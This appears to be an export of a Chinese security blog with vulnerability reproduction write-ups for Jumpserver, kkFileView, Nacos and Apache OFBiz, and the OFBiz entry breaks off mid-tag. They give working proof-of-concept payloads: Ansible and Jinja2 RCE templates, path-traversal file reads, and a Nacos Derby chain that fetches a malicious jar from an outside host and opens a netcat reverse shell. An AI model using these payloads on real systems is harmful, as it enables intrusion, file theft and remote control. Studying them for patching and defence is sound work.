class="hljs-selector-class">.getDecoder</span>()<span class="hljs-selector-class">.decode</span>(<span class="hljs-string">&quot;whoami&quot;</span>)))<br></code></pre></td></tr></table></figure><p>src&#x2F;main&#x2F;java&#x2F;org&#x2F;openmetadata&#x2F;service&#x2F;resources&#x2F;policies&#x2F;PolicyResource.java  JAX-RS（Java API for RESTful Web Services）规范编写的Java方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GET</span><br><span class="hljs-comment">// @Path 注解定义了此方法处理的URL路径。&#123;expression&#125; 是一个路径参数，它将被替换为客户端在请求URL中提供的具体值。</span><br> <span class="hljs-meta">@Path(&quot;/validation/condition/&#123;expression&#125;&quot;)</span><br> <span class="hljs-meta">@Operation(</span><br><span class="hljs-meta">     operationId = &quot;validateCondition&quot;,</span><br><span class="hljs-meta">     summary = &quot;Validate a given condition&quot;,</span><br><span class="hljs-meta">     description = &quot;Validate a given condition expression used in authoring rules.&quot;,</span><br><span class="hljs-meta">     responses = &#123;</span><br><span class="hljs-meta">       @ApiResponse(responseCode = &quot;204&quot;, description = &quot;No value is returned&quot;),</span><br><span class="hljs-meta">       @ApiResponse(responseCode = &quot;400&quot;, description = &quot;Invalid expression&quot;)</span><br><span class="hljs-meta">     &#125;)</span><br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">validateCondition</span><span class="hljs-params">(</span><br><span class="hljs-params">     <span class="hljs-meta">@Context</span> UriInfo uriInfo,</span><br><span class="hljs-params">     <span class="hljs-meta">@Context</span> SecurityContext securityContext,</span><br><span class="hljs-params">     <span class="hljs-meta">@Parameter(description = &quot;Expression of validating rule&quot;, schema = @Schema(type = &quot;string&quot;))</span></span><br><span class="hljs-params">         <span class="hljs-meta">@PathParam(&quot;expression&quot;)</span></span><br><span class="hljs-params">         String expression)</span> &#123;<br>   CompiledRule.validateExpression(expression, Boolean.class);   <span class="hljs-comment">//到这里</span><br> &#125;<br> <br></code></pre></td></tr></table></figure><p>src&#x2F;main&#x2F;java&#x2F;org&#x2F;openmetadata&#x2F;service&#x2F;events&#x2F;subscription&#x2F;AlertUtil.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T&gt; T <span class="hljs-title function_">validateExpression</span><span class="hljs-params">(String condition, Class&lt;T&gt; clz)</span> &#123;<br>  <span class="hljs-keyword">if</span> (condition == <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>  &#125;<br>  <span class="hljs-type">Expression</span> <span class="hljs-variable">expression</span> <span class="hljs-operator">=</span> parseExpression(condition);<br>  <span class="hljs-type">AlertsRuleEvaluator</span> <span class="hljs-variable">ruleEvaluator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AlertsRuleEvaluator</span>(<span class="hljs-literal">null</span>);<br>  <span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-keyword">return</span> expression.getValue(ruleEvaluator, clz);<br>  &#125; <span class="hljs-keyword">catch</span> (Exception exception) &#123;<br>    <span class="hljs-comment">// Remove unnecessary class details in the exception message</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> exception.getMessage().replaceAll(<span class="hljs-string">&quot;on type .*$&quot;</span>, <span class="hljs-string">&quot;&quot;</span>).replaceAll(<span class="hljs-string">&quot;on object .*$&quot;</span>, <span class="hljs-string">&quot;&quot;</span>);<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(CatalogExceptionMessage.failedToEvaluate(message));<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>src&#x2F;main&#x2F;java&#x2F;org&#x2F;openmetadata&#x2F;service&#x2F;security&#x2F;policyevaluator&#x2F;CompiledRule.java</p><p>parseExpression</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Expression <span class="hljs-title function_">parseExpression</span><span class="hljs-params">(String condition)</span> &#123;<br>    <span class="hljs-keyword">if</span> (condition == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>    <span class="hljs-comment">//这里的try块尝试使用EXPRESSION_PARSER（显然是一个静态引用，可能是一个已经初始化的解析器实例）的parseExpression方法来解析传入的condition字符串。</span><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">return</span> EXPRESSION_PARSER.parseExpression(condition);<br>    &#125; <span class="hljs-keyword">catch</span> (Exception exception) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(CatalogExceptionMessage.failedToParse(exception.getMessage()));<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h5 id="Jumpserver"><a href="#Jumpserver" class="headerlink" title="Jumpserver"></a>Jumpserver</h5><hr><p><strong>Jumpserver&lt;3.10.7 Jinja2注入远程代码执行漏洞(CVE-2024-29202)</strong></p><p><strong>条件</strong>：需要admin赋权user一个资产</p><p><strong>原理</strong>：user可执行命令到celery容器。</p><p><strong>复现过程</strong>：admin创建一个user，并且给user赋权一个资产。登录user账号，在test中的模板管理创建一个playbook，在工具空间中加入payload</p><p><img src="image-20240410141953158-17127299976851.png" alt="image-20240410141953158"></p><p>poc：</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs yml">[&#123;<br>     <span class="hljs-attr">&quot;name&quot;:</span> <span class="hljs-string">&quot;RCE playbook&quot;</span>,<br>     <span class="hljs-attr">&quot;hosts&quot;:</span> <span class="hljs-string">&quot;all&quot;</span>,<br>     <span class="hljs-attr">&quot;tasks&quot;:</span> [<br>       &#123;<br>         <span class="hljs-attr">&quot;name&quot;:</span> <span class="hljs-string">&quot;this runs in Celery container&quot;</span>,<br>         <span class="hljs-attr">&quot;shell&quot;:</span> <span class="hljs-string">&quot;id &gt; /tmp/pwnd&quot;</span>,<br>         <span class="hljs-string">&quot;\u0064elegate_to&quot;</span><span class="hljs-string">:</span> <span class="hljs-string">&quot;localhost&quot;</span><br>&#125; ],<br>     <span class="hljs-attr">&quot;vars&quot;:</span> &#123;<br>     <span class="hljs-string">&quot;ansible_\u0063onnection&quot;</span><span class="hljs-string">:</span> <span class="hljs-string">&quot;local&quot;</span><br>     &#125;<br>&#125;]<br></code></pre></td></tr></table></figure><p>添加完成后，在作业管理中添加作业运行</p><p><img src="image-20240410142133058-17127300962783.png" alt="image-20240410142133058"></p><p>在本机的celery容器中的&#x2F;tmp下有写入命令</p><p><img src="image-20240410142357014-17127302400035.png" alt="image-20240410142357014"></p><p><strong>漏洞分析</strong>：</p><p><strong>Jumpserver&lt;3.10.7 Ansible Playbook远程代码执行漏洞(CVE-2024-29201)</strong></p><p>复现过程和上面一样</p><p><img src="image-20240410153216978.png" alt="image-20240410153216978"></p><p>poc</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs yml"><span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">|</span><br><span class="hljs-string">       &#123;% for x in ().__class__.__base__.__subclasses__() %&#125;</span><br><span class="hljs-string">         &#123;% if &quot;warning&quot; in x.__name__ %&#125;</span><br><span class="hljs-string">           &#123;&#123;</span><br><span class="hljs-string">             x()._module.__builtins__[&quot;__import__&quot;](&quot;os&quot;).system(&quot;id &gt; /tmp/pwnd2&quot;)</span><br><span class="hljs-string">           &#125;&#125;</span><br><span class="hljs-string">         &#123;%endif%&#125;</span><br><span class="hljs-string">       &#123;%endfor%&#125;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>OpenMetadata</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>kkFileView漏洞总结</title>
    <link href="/2025/03/22/kkFileView%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    <url>/2025/03/22/kkFileView%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h5 id="kkFileView-onlinePreview-文件读取漏洞"><a href="#kkFileView-onlinePreview-文件读取漏洞" class="headerlink" title="kkFileView onlinePreview 文件读取漏洞"></a>kkFileView onlinePreview 文件读取漏洞</h5><h6 id="0x01简介"><a href="#0x01简介" class="headerlink" title="0x01简介"></a>0x01简介</h6><p>kkFileView 是一个基于 Java 开发的开源文件在线预览项目，旨在为开发者提供一个方便的、无需开发复杂前端代码就能实现文件在线预览的解决方案。其支持预览多种类型的文件，例如 Office 文档、PDF、文本文件以及图片等。</p><h6 id="0x02漏洞概述"><a href="#0x02漏洞概述" class="headerlink" title="0x02漏洞概述"></a>0x02漏洞概述</h6><p>在<code>src/main/java/cn/keking/web/controller/OnlinePreviewController.java</code>文件的onlinePreview接口对url参数没有进行过滤，导致了任意文件读取。</p><h6 id="0x03影响版本"><a href="#0x03影响版本" class="headerlink" title="0x03影响版本"></a>0x03影响版本</h6><p>kkFileview &lt;&#x3D; 4.1.0 （网上都说漏洞在3.6.0之下，笔者下载了3.6.0–4.4.0发现这个漏洞持续到4.1.0）</p><p><img src="1713533569197-abaf06e9-39d5-4a45-bcb3-fd4369c269e7.png" alt="img"></p><h6 id="0x04环境搭建"><a href="#0x04环境搭建" class="headerlink" title="0x04环境搭建"></a>0x04环境搭建</h6><p><a href="https://github.com/kekingcn/kkFileView/releases">https://github.com/kekingcn/kkFileView/releases</a></p><p>下载想要的版本，在idea下运行</p><p><img src="1713535944706-cb9b934f-9268-4d84-9682-83cc79097aae.png" alt="img"></p><p><img src="1713536007848-9c403453-56a8-40e1-b3bb-8db5715b4d35.png" alt="img"></p><h6 id="0x05漏洞利用"><a href="#0x05漏洞利用" class="headerlink" title="0x05漏洞利用"></a>0x05漏洞利用</h6><p>poc</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/onlinePreview?url=http:/</span><span class="hljs-number">1</span><span class="hljs-regexp">/?fullfilename=../</span>..<span class="hljs-regexp">/../</span>../pom.xml<br></code></pre></td></tr></table></figure><p>base64加密：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">/onlinePreview?<span class="hljs-attribute">url</span>=aHR0cDovMSEvP2Z1bGxmaWxlbmFtZT0uLi8uLi8uLi8uLi9wb20ueG1s <br></code></pre></td></tr></table></figure><p><img src="1713535985496-7c498d7d-63df-4b61-9a24-39722dd53baf.png" alt="img"></p><h6 id="0x06漏洞分析"><a href="#0x06漏洞分析" class="headerlink" title="0x06漏洞分析"></a>0x06漏洞分析</h6><p><code>server/src/main/java/cn/keking/web/controller/OnlinePreviewController.java</code>。</p><p><img src="1713533796182-25434946-5184-4e10-81dc-f1dda66ce2cb.png" alt="img"></p><p>跟踪到getFileAttribute</p><p><code>server/src/main/java/cn/keking/service/FileHandlerService.java</code>。</p><p><img src="1713534092421-5cea4a0a-0084-40e2-b51d-389a570cb495.png" alt="img"></p><p>调试<code>filePreview.filePreviewHandle(fileUrl, model, fileAttribute)</code>。</p><p><img src="1713535099142-f9ee4782-f33b-451b-9543-2396df2dc38a.png" alt="img"></p><p>到<code>String fileData = HtmlUtils.htmlEscape(textData(filePath))</code>。</p><p><img src="1713536322712-ac90404c-cc7d-443f-b6d8-840aae20c157.png" alt="img"></p><p>可以看到对pom.xml内容进行了加载。</p><p><img src="1713536248352-381ef5ed-7eee-4591-a746-a53079af55fb.png" alt="img"></p><h6 id="0x07修复方式"><a href="#0x07修复方式" class="headerlink" title="0x07修复方式"></a>0x07修复方式</h6><p>更新到最新版本</p><h6 id="0x08参考链接"><a href="#0x08参考链接" class="headerlink" title="0x08参考链接"></a>0x08参考链接</h6><p><a href="https://github.com/kekingcn/kkFileView/issues/420">https://github.com/kekingcn/kkFileView/issues/420</a></p><h5 id="kkfileview-getCorsFile-文件读取漏洞"><a href="#kkfileview-getCorsFile-文件读取漏洞" class="headerlink" title="kkfileview getCorsFile 文件读取漏洞"></a>kkfileview getCorsFile 文件读取漏洞</h5><h6 id="0x01简介-1"><a href="#0x01简介-1" class="headerlink" title="0x01简介"></a>0x01简介</h6><p>kkFileView 是一个基于 Java 开发的开源文件在线预览项目，旨在为开发者提供一个方便的、无需开发复杂前端代码就能实现文件在线预览的解决方案。其支持预览多种类型的文件，例如 Office 文档、PDF、文本文件以及图片等。</p><h6 id="0x02漏洞概述-1"><a href="#0x02漏洞概述-1" class="headerlink" title="0x02漏洞概述"></a>0x02漏洞概述</h6><p>在<code>src/main/java/cn/keking/web/controller/OnlinePreviewController.java</code>文件的getCorsFile接口对urlPath参数没有进行过滤，导致了任意文件读取。</p><h6 id="0x03影响版本-1"><a href="#0x03影响版本-1" class="headerlink" title="0x03影响版本"></a>0x03影响版本</h6><p>3.5.1 &lt;&#x3D; kkFileview &lt;&#x3D; 4.0.0</p><h6 id="0x04环境搭建-1"><a href="#0x04环境搭建-1" class="headerlink" title="0x04环境搭建"></a>0x04环境搭建</h6><p><img src="1713582948357-a23b2976-4b75-4ffa-bc9d-4176f948ea64.png" alt="img"></p><h6 id="0x05漏洞利用-1"><a href="#0x05漏洞利用-1" class="headerlink" title="0x05漏洞利用"></a>0x05漏洞利用</h6><p>poc:</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams">/getCorsFile?urlPath=<span class="hljs-keyword">file</span>:C:\\windows\<span class="hljs-keyword">system</span>.ini<br></code></pre></td></tr></table></figure><p><img src="1713531774692-e556ce2e-f046-48f3-a42f-e5058dee1c43.png" alt="img"></p><p><img src="1713531817408-3a75040f-4189-48d6-bb17-eaa7d59987af.png" alt="img"></p><h6 id="0x06漏洞分析-1"><a href="#0x06漏洞分析-1" class="headerlink" title="0x06漏洞分析"></a>0x06漏洞分析</h6><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">src<span class="hljs-regexp">/main/</span>java<span class="hljs-regexp">/cn/</span>keking<span class="hljs-regexp">/web/</span>controller/OnlinePreviewController.java<br></code></pre></td></tr></table></figure><p><img src="1713584139434-3d41a663-a7b2-45e5-a176-d49113711453.png" alt="img"></p><p>创建了一个InputStream对象，用于从指定的URL读取数据。并返回</p><p><img src="1713584803384-5028eeb8-e57a-4ad8-8200-9d3e1483cb73.png" alt="img"></p><p>进入<code>StreamUtil.readBytes(inputStream)</code>，可以发现是一个简单的从输入流中读取数据并返回。</p><p><img src="1713585796967-500cc452-bebd-4f98-b333-f8f686732761.png" alt="img"></p><p><img src="1713585818761-b31a1cd8-8f62-46d7-a2e5-56b5249c7c84.png" alt="img"></p><h6 id="0x07修复方式-1"><a href="#0x07修复方式-1" class="headerlink" title="0x07修复方式"></a>0x07修复方式</h6><p>升级到4.2.1及以上</p><h6 id="0x08参考链接-1"><a href="#0x08参考链接-1" class="headerlink" title="0x08参考链接"></a>0x08参考链接</h6><p><a href="https://github.com/kekingcn/kkFileView/issues/304">https://github.com/kekingcn/kkFileView/issues/304</a></p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>kkFileView</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NACOS RCE命令执行漏洞</title>
    <link href="/2025/03/22/nacos-RCE%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
    <url>/2025/03/22/nacos-RCE%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h2 id="0x01简介"><a href="#0x01简介" class="headerlink" title="0x01简介"></a>0x01简介</h2><p>Nacos 是一个用于动态服务发现和配置以及服务管理的平台，Derby 是一个Java 类库的形式对外提供服务的数据库引擎。</p><h2 id="0x02漏洞概述"><a href="#0x02漏洞概述" class="headerlink" title="0x02漏洞概述"></a>0x02漏洞概述</h2><p>Nacos Derby数据库接口&#x2F;nacos&#x2F;v1&#x2F;cs&#x2F;ops&#x2F;derby 和 &#x2F;nacos&#x2F;v1&#x2F;cs&#x2F;ops&#x2F;data&#x2F;removal 存在条件竞争漏洞，攻击者可借此接口执行恶意SQL，加载恶意jar并注册函数，在未授权条件下利用 derby sql 注入漏洞（CVE-2021-29442）调用恶意函数来执行恶意代码。</p><h2 id="0x03影响版本"><a href="#0x03影响版本" class="headerlink" title="0x03影响版本"></a>0x03影响版本</h2><p>nacos &lt; 2.4.0</p><h2 id="0x04环境搭建"><a href="#0x04环境搭建" class="headerlink" title="0x04环境搭建"></a>0x04环境搭建</h2><p>从官方网站下载安装包，运行命令安装</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">./startup.cmd -m standalone<br></code></pre></td></tr></table></figure><p><img src="1722630836036-646f8b31-2f4a-46fb-8656-80ca11b418f5.png" alt="img"></p><p>docker搭建（需要配置&#x2F;etc&#x2F;docker&#x2F;daemon.json）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs plain">docker pull nacos/nacos-server:v2.3.2<br><br>docker run --name demo-nacos-server \<br>-p 8848:8848 \<br>-p 9848:9848 \<br>-p 9849:9849 \<br>--privileged=true \<br>--restart=always \<br>-e JVM_XMS=256m \<br>-e JVM_XMX=256m \<br>-e MODE=standalone \<br>-e PREFER_HOST_MODE=hostname \<br>-d nacos/nacos-server:v2.3.2<br></code></pre></td></tr></table></figure><h2 id="0x05漏洞复现"><a href="#0x05漏洞复现" class="headerlink" title="0x05漏洞复现"></a>0x05漏洞复现</h2><p>idea编写一个恶意jar</p><p><img src="1722669207932-2d1ff485-7159-479a-84a9-d1cd894f3d9c.png" alt="img"></p><p>jar生成</p><p><img src="1722671852184-0fcb49ca-c54e-484a-8520-520f1701212a.png" alt="img"></p><p><img src="1722671923970-7f8d23c8-1b5c-4c8c-9808-884f85f85434.png" alt="img"></p><p>Example.java：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs plain">package test.poc;<br><br>import java.io.BufferedReader;<br>import java.io.IOException;<br>import java.io.InputStream;<br>import java.io.InputStreamReader;<br>import java.io.PrintWriter;<br>import java.io.StringWriter;<br><br>/* loaded from: Example.class */<br>public class Example &#123;<br>    public static void main(String[] args) &#123;<br>        String ret = exec(&quot;ipconfig&quot;);<br>        System.out.println(ret);<br>    &#125;<br><br>    public static String exec(String cmd) &#123;<br>        StringBuffer bf = new StringBuffer();<br>        try &#123;<br>            String charset = &quot;utf-8&quot;;<br>            String osName = System.getProperty(&quot;os.name&quot;);<br>            if (osName != null &amp;&amp; osName.startsWith(&quot;Windows&quot;)) &#123;<br>                charset = &quot;gbk&quot;;<br>            &#125;<br>            Process p = Runtime.getRuntime().exec(cmd);<br>            InputStream fis = p.getInputStream();<br>            InputStreamReader isr = new InputStreamReader(fis, charset);<br>            BufferedReader br = new BufferedReader(isr);<br>            while (true) &#123;<br>                String line = br.readLine();<br>                if (line != null) &#123;<br>                    bf.append(line);<br>                &#125; else &#123;<br>                    return bf.toString();<br>                &#125;<br>            &#125;<br>        &#125; catch (Exception e) &#123;<br>            StringWriter writer = new StringWriter();<br>            PrintWriter printer = new PrintWriter(writer);<br>            e.printStackTrace(printer);<br>            try &#123;<br>                writer.close();<br>                printer.close();<br>            &#125; catch (IOException e2) &#123;<br>            &#125;<br>            return &quot;ERROR:&quot; + writer.toString();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="1722669413816-75064e8b-78cb-4403-ad80-d041c5896cdf.png" alt="img"></p><p>构造请求，加载命令执行jar</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs plain">POST /nacos/v1/cs/ops/data/removal HTTP/1.1<br>Host: 192.168.229.1:8848<br>User-Agent: python-requests/2.32.3<br>Accept-Encoding: gzip, deflate, br<br>Accept: */*<br>Connection: close<br>Content-Length: 489<br>Content-Type: multipart/form-data; boundary=2a262c4e7ea55d81b1906382912b7422<br><br>--2a262c4e7ea55d81b1906382912b7422<br>Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;file&quot;<br><br>CALL sqlj.install_jar(&#x27;http://192.168.244.133:8000/test.jar&#x27;, &#x27;NACOS.jtZJBFpM&#x27;, 0)<br><br>        CALL SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY(&#x27;derby.database.classpath&#x27;,&#x27;NACOS.jtZJBFpM&#x27;)<br><br>        CREATE FUNCTION S_EXAMPLE_jtZJBFpM( PARAM VARCHAR(2000)) RETURNS VARCHAR(2000) PARAMETER STYLE JAVA NO SQL LANGUAGE JAVA EXTERNAL NAME &#x27;test.poc.Example.exec&#x27;<br><br>--2a262c4e7ea55d81b1906382912b7422--<br></code></pre></td></tr></table></figure><p><img src="1722671019491-eee548da-4caf-458b-8e6e-1e8587b435bf.png" alt="img"></p><ul><li>调用了一个 sqlj.install_jar 存储过程，用于安装一个 JAR 文件。该 JAR 文件被从<a href="http://192.168.244.133:8000/test.java%E4%B8%8B%E8%BD%BD%E3%80%82">http://192.168.244.133:8000/test.java下载。</a></li><li>调用了 SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY 存储过程，将属性 derby.database.classpath 的值设置为 NACOS.bGgDnUtc，使 Derby 数据库能够加载该 JAR 文件。</li><li>创建了一个名为 S_EXAMPLE_jtZJBFpM 的方法。该函数的具体实现是在 Java 类 test.poc.Example 的 exec 方法(因为是条件竞赛，id&#x3D;jtZJBFpM可能会失效，可以用python随机生成)。</li></ul><p>访问构造的方法，实现命令执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plain">GET /nacos/v1/cs/ops/derby?sql=select%20*%20from%20(select%20count(*)%20as%20b%2c%20S_EXAMPLE_jtZJBFpM(&#x27;calc&#x27;)%20as%20a%20from%20config_info)%20tmp%20%2f*ROWS%20FETCH%20NEXT*%2f HTTP/1.1<br>Host: 192.168.229.1:8848<br>User-Agent: python-requests/2.32.3<br>Accept-Encoding: gzip, deflate, br<br>Accept: */*<br>Connection: close<br></code></pre></td></tr></table></figure><p><img src="1722671143824-c1c2b5d4-4b94-479d-9dd7-9fc4143eb58d.png" alt="img"></p><p><strong>反弹shell</strong></p><p>打开监听端口</p><p><img src="1722629876301-dc6d607a-c083-4783-94be-adfaa21a8838.png" alt="img"></p><p>构造恶意请求</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plain">GET /nacos/v1/cs/ops/derby?sql=select%20*%20from%20(select%20count(*)%20as%20b%2c%20S_EXAMPLE_jtZJBFpM(&#x27;nc.exe%20-e%20cmd%20192.168.244.133%207777&#x27;)%20as%20a%20from%20config_info)%20tmp%20%2f*ROWS%20FETCH%20NEXT*%2f HTTP/1.1<br>Host: 192.168.229.1:8848<br>User-Agent: python-requests/2.32.3<br>Accept-Encoding: gzip, deflate, br<br>Accept: */*<br>Connection: close<br></code></pre></td></tr></table></figure><p><img src="1722671329489-507d292d-1bc8-49a5-9407-0fd469b7efed.png" alt="img"></p><p>成功收到 shell</p><p><img src="1722671347815-3d043fb1-65e1-40b7-b9e5-3263bbfcf79e.png" alt="img"></p><h2 id="0x06修复方式"><a href="#0x06修复方式" class="headerlink" title="0x06修复方式"></a>0x06修复方式</h2><p>将组件 nacos 升级至 2.4.0 及以上版本</p><h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><p><a href="https://www.oscs1024.com/hd/MPS-sxgr-j9ak">https://www.oscs1024.com/hd/MPS-sxgr-j9ak</a></p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>nacos</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2024-38856 Apache OFBiz 远程代码执行漏洞</title>
    <link href="/2025/03/22/CVE-2024-38856-Apache-OFBiz-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
    <url>/2025/03/22/CVE-2024-38856-Apache-OFBiz-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h2 id="0x01简介"><a href="#0x01简介" class="headerlink" title="0x01简介"></a>0x01简介</h2><p>Apache OFBiz使用Java语言开发，基于Java企业版（Java EE）的技术栈，包括Java Servlet、JavaServer Pages（JSP）、Java数据库连接（JDBC）等。</p><h2 id="0x02漏洞概述"><a href="#0x02漏洞概述" class="headerlink" title="0x02漏洞概述"></a>0x02漏洞概述</h2><p>ControlServlet和RequestHandler函数，在处理请求中未授权验证，导致攻击者可绕过原有的安全验证，执行恶意代码</p><h2 id="0x03漏洞版本"><a href="#0x03漏洞版本" class="headerlink" title="0x03漏洞版本"></a>0x03漏洞版本</h2><p>Apache OFBiz  &lt;&#x3D;  18.12.14</p><h2 id="0x04环境搭建"><a href="#0x04环境搭建" class="headerlink" title="0x04环境搭建"></a>0x04环境搭建</h2><p><a href="https://github.com/apache/ofbiz-framework/releases/tag/release18.12.14">https://github.com/apache/ofbiz-framework/releases/tag/release18.12.14</a></p><p>在官网中下载ofbiz，idea打开，构建</p><p><img src="1723777828412-147f1391-ed90-455b-a398-e7e39b3bb049.png" alt="img"></p><p>在ofbiz-framework-release18.12.14\framework\security\config\security.properties里添加私有IP地址（方便攻击）</p><p><img 